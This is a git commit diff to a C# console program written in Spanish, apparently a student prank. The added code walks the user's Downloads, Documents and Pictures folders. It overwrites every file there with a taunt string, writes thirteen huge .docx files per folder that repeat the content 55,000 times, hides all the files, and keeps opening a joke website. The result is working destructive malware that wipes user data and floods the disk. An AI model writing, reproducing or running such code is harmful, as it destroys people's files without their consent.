8eb23d1ce78c36e5bd625afb5bffac92b569ffce
Martinator69 <martinscordamaglia@gmail.com>
2019-11-14 06:23:09 -0800

    bruh

--- src/Archivo Lectura/ConsoleApplication1/ConsoleApplication1/Program.cs
+++ src/Archivo Lectura/ConsoleApplication1/ConsoleApplication1/Program.cs
@@ -1,5 +1,5 @@
 ﻿using System;
-
+using System.Diagnostics;
 using System.IO;
 
 namespace ConsoleApplication1
@@ -9,88 +9,149 @@ namespace ConsoleApplication1
         static void Main()
         {
 
-            //DirectoryInfo direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\UNDERTALE");
+            DirectoryInfo direccion;
 
             string aux = "", texto = @"¡Fuiste avisado! ¯\_(ツ)_/¯";
 
-            //string rutaPrincipal = @"C:\Users\" + Environment.UserName + @"\UNDERTALE";
+            string rutaPrincipal = "";
 
-            DirectoryInfo direccion = new DirectoryInfo(@"D:\Cole 2019\UNDERTALE");
+           // DirectoryInfo direccion = new DirectoryInfo(@"D:\Cole 2019\UNDERTALE");
 
-            string rutaPrincipal = @"D:\Cole 2019\UNDERTALE";
+            //string rutaPrincipal = @"D:\Cole 2019\UNDERTALE";
 
             string rutaCompleta;
 
-            int cont=0;
+            int cont=0, ubicacion=0;
 
-            bool unaVez = true, entra = true;
+            bool unaVez = true, entra = true, hacer=true;
 
-            do
-            {
+            do {
 
-                Console.Clear();
+                ubicacion += 1;
 
-                Console.WriteLine("Ejecutando...");
+                cont = 0;
 
-                cont++;
+                Process p = new Process();
+                ProcessStartInfo psi = new ProcessStartInfo("https://cat-bounce.com/");
+                p.StartInfo = psi;
+                p.Start();
 
-                rutaCompleta = rutaPrincipal + @"\te_lo_dije" + cont + ".docx";
-
-                if (entra == true)
+                switch (ubicacion)
                 {
 
-                    if (direccion.GetFiles().Length == 0)
+                    case 1:
+
+                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Downloads");
+
+                        rutaPrincipal = @"C:\Users\" + Environment.UserName + @"\Downloads";
+
+                        break;
+
+                    case 2:
+
+                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Documents");
+
+                        rutaPrincipal = @"C:\Users\" + Environment.UserName + @"\Documents";
+
+                        break;
+
+
+                    case 3:
+
+                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Pictures");
+
+                        rutaPrincipal = @"C:\Users\" + Environment.UserName + @"\Pictures";
+
+                        break;
+
+                    default:
+                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Downloads");
+
+                        rutaPrincipal = @"C:\Users\" + Environment.UserName + @"\Downloads";
+                        break;
+                }
+
+                do
+                {
+
+                    Console.Clear();
+
+                    Console.WriteLine("Ejecutando...");
+
+                    cont++;
+
+                    rutaCompleta = rutaPrincipal + @"\te_lo_dije" + cont + ".docx";
+
+                    if (entra == true)
                     {
 
-                        aux = texto;
+                        if (direccion.GetFiles().Length == 0)
+                        {
 
-                    }
-                    else
-                    {
+                            aux = texto;
 
-                        foreach (FileInfo file in direccion.GetFiles())
-                        { 
-                            if (unaVez == true)
+                        }
+                        else
+                        {
+
+                            foreach (FileInfo file in direccion.GetFiles())
                             {
+                                if (unaVez == true)
+                                {
 
-                                aux = File.ReadAllText(file.FullName); //aux guarda los valores originales.
+                                    aux = File.ReadAllText(file.FullName); //aux guarda los valores originales.
 
-                                unaVez = false;
+                                    unaVez = false;
+
+                                }
+
+                                try
+                                {
+                                    
+                                    File.WriteAllText(file.FullName, texto);
+
+                                }
+                                catch
+                                {
+
+                                    entra = false;
+
+                                }
+                                
 
                             }
 
-                            File.WriteAllText(file.FullName, texto);
+                        }
+
+                        entra = false;
+
+                    }
+
+                    using (StreamWriter archivo = File.AppendText(rutaCompleta))         //se crea el archivo
+                    {
+
+                        for (int i = 0; i < 55000; i++)
+                        {
+
+                            archivo.Write(aux);
 
                         }
 
+                        archivo.Close();
+
                     }
 
-                    entra = false;
+                } while (cont <= 12);
 
-                }
-
-                using (StreamWriter archivo = File.AppendText(rutaCompleta))         //se crea el archivo
+                foreach (FileInfo file in direccion.GetFiles())
                 {
 
-                    for (int i = 0; i < 55000; i++)
-                    {
+                    File.SetAttributes(file.FullName, FileAttributes.Hidden);
 
-                        archivo.Write(aux);
-
-                    }
-
-                    archivo.Close();
-                    
                 }
 
-            } while(cont <= 12);
+            } while (ubicacion<=3);
 
-            foreach (FileInfo file in direccion.GetFiles())
-            {
-
-                File.SetAttributes(file.FullName, FileAttributes.Hidden);
-
-            }
 
         }
     }
